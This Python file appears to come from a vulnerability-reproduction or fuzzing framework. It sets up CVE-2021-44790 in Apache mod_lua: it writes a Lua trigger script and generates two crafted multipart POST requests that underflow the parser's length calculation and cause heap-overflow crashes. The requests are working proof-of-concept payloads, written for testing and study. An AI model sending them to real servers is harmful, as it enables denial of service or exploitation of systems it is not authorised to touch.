"""CVE-2021-44790 - Heap buffer overflow in mod_lua multipart parser.

A crafted multipart/form-data POST body causes an integer underflow
in `req_parsebody` (lua_request.c) when the distance between the part
headers and the next boundary is less than 8 bytes, wrapping the
`size_t` length passed to `memcpy`.
"""

from pathlib import Path

from apatchy.bugs.base import Bug
from apatchy.utils.logger import get_logger

logger = get_logger(__name__)


class CVE_2021_44790(Bug):
    """Integer underflow to Heap Buffer Overflow in mod_lua multipart parser."""

    def setup(self) -> None:
        """Create DocumentRoot with a Lua script."""
        htdocs = Path("/tmp/htdocs")
        htdocs.mkdir(exist_ok=True)

        # Lua file that triggers the vulnerable path by calling r:parserequest
        poc_lua = htdocs / "poc.lua"
        if poc_lua.exists():
            logger.info("poc.lua already exists, skipping")
            return

        lua_trigger: str = (
            '-- No need to require "string" for basic iteration\n'
            "-- The 'r' object is passed automatically by mod_lua\n"
            "function handle(r)\n"
            '    r.content_type = "text/plain"\n'
            '    r:write("Argument Parser Output:\\n")\n'
            '    r:write("-----------------------\\n")\n'
            "    -- 1. Parse GET arguments (Query string)\n"
            "    local args, args_table = r:parseargs()\n"
            "    -- 2. Parse POST arguments (Request body)\n"
            "    -- This returns a table of key/value pairs\n"
            "    local body = r:parsebody()\n"
            '    r:write("brrrr\\n")\n'
            "    return apache2.OK\n"
            "end"
        )

        logger.info("creating poc.lua")
        poc_lua.write_bytes(lua_trigger.encode())
        logger.info("Created poc.lua")

    def generate_seeds(self) -> None:
        """Generate seeds for both output and input filter trigger paths."""
        seeds_dir = self.seeds_dir
        seeds_dir.mkdir(exist_ok=True)
        logger.info("Generating seeds...")
        self._allocation_size_too_big(seeds_dir)
        self._negative_size_param(seeds_dir)
        logger.info("Seeds generated.")

    def _allocation_size_too_big(self, seeds_dir: Path) -> None:
        """Trigger allocation-size-too-big in apr_pcalloc (lua_request.c:414).

        The parser finds boundary "a" in the Content-Disposition header
        value itself, making ``end`` land inside the headers.  This gives
        ``end - crlf < 8``, so ``vlen`` wraps to ~0xFFFFFFFFFFFFFFFF and
        apr_pcalloc refuses the absurd allocation.
        """
        seed_fd = seeds_dir / "alloc_size_big.txt"
        if seed_fd.exists():
            logger.info("alloc_size_big.txt already exists, skipping")
            return

        body = (
            "--a\r\n"                                        # part boundary
            'Content-Disposition: form-data; name="pew"\r\n' # part header (contains "a")
            "a\r\n"                                          # minimal body content
            "\r\n"                                           # end of part
            "--a--\r\n"                                      # closing boundary
        )
        headers = (
            "POST /poc.lua HTTP/1.1\r\n"
            "Host: localhost\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Content-Type: multipart/form-data; boundary=a\r\n"
            "\r\n"
        )
        seed_fd.write_bytes((headers + body).encode())

    def _negative_size_param(self, seeds_dir: Path) -> None:
        """Trigger negative-size-param in memcpy (lua_request.c:415).

        Two parts with minimal content between boundaries.  On the
        second iteration ``end - crlf`` is less than 8, wrapping
        ``vlen`` to a huge size_t.  Unlike ``_allocation_size_too_big``,
        this payload reaches the ``memcpy`` call (the allocation
        succeeds because the pool has enough slack), triggering ASan's
        negative-size-param detector.
        """
        seed_fd = seeds_dir / "negative_size.txt"
        if seed_fd.exists():
            logger.info("negative_size.txt already exists, skipping")
            return

        body = (
            "--a\r\n"    # first part boundary
            "\r\n"       # empty part headers
            "\r\n"       # empty body -> crlf and end are close together
            "--a\r\n"    # second part boundary
            "z\r\n"      # minimal header (just "z", not a valid header)
            "\r\n"       # end of headers -> crlf points here
            "---a--\r\n" # closing boundary; extra "-" shifts where "a" is found
            "\r\n"       # trailing CRLF
        )
        headers = (
            "POST /poc.lua HTTP/1.1\r\n"
            "Host: localhost\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Content-Type: multipart/form-data; boundary=a\r\n"
            "\r\n"
        )
        seed_fd.write_bytes((headers + body).encode())

    def clean(self) -> None:
        """Remove generated seeds and htdocs."""
        super().clean()
        htdocs = Path("/tmp/htdocs")
        if htdocs.exists():
            import shutil

            shutil.rmtree(htdocs)
            logger.info(f"Removed {htdocs}")
